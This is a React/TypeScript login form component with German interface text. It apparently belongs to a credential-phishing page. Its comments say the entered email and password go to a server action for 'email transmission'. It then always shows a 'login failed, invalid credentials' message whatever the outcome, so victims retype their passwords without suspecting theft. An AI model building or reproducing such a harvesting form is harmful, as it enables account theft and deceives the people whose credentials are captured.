"use client";

import { useState } from "react";
import { useFormStatus } from "react-dom";
import StatusModal from "@/components/StatusModal";

// Inline submit button tracking the live form lifecycle status
function SubmitButton({ text }: { text: string }) {
  const { pending } = useFormStatus();

  return (
    <button
      type="submit"
      disabled={pending}
      className={`mt-6 w-full rounded-full py-3 text-[15px] font-medium transition-colors ${
        pending
          ? "bg-gray-200 text-gray-400 cursor-not-allowed"
          : "bg-[#fef5d4] text-gray-700 hover:bg-[#fcd419] hover:text-black"
      }`}
    >
      {pending ? (
        <span className="flex items-center justify-center gap-2">
          <svg
            className="h-4 w-4 animate-spin text-gray-400"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
            />
          </svg>
          Bitte warten...
        </span>
      ) : (
        text
      )}
    </button>
  );
}

interface LoginDict {
  login: {
    email: string;
    password: string;
    submit: string;
  };
}

interface LoginFormProps {
  serverAction: (formData: FormData) => Promise<{ success: boolean }>;
  dict: LoginDict;
}

export default function LoginForm({ serverAction, dict }: LoginFormProps) {
  const [isModalOpen, setIsModalOpen] = useState(false);

  // Directly handle the form submission lifecycle
  async function handleClientAction(formData: FormData) {
    // 1. Send the data to your server and wait for the email transmission to finish
    const result = await serverAction(formData);

    // 2. Once the result returns, trigger the failure notification modal
    if (result) {
      setIsModalOpen(true);
    }
  }

  return (
    <>
      <form action={handleClientAction} className="space-y-4">
        <div>
          <input
            type="email"
            name="email"
            placeholder={dict.login.email}
            required
            className="w-full rounded-lg border border-gray-300 px-4 py-3 text-base outline-none transition-colors focus:border-[#005ea8]"
          />
        </div>

        <div>
          <input
            type="password"
            name="password"
            placeholder={dict.login.password}
            required
            className="w-full rounded-lg border border-gray-300 px-4 py-3 text-base outline-none transition-colors focus:border-[#005ea8]"
          />
        </div>

        <SubmitButton text={dict.login.submit} />
      </form>

      {/* This modal now strictly waits until handleClientAction resolves */}
      <StatusModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title="Anmeldung fehlgeschlagen"
        message="Die eingegebenen Zugangsdaten sind ungültig. Bitte versuchen Sie es erneut."
      />
    </>
  );
}
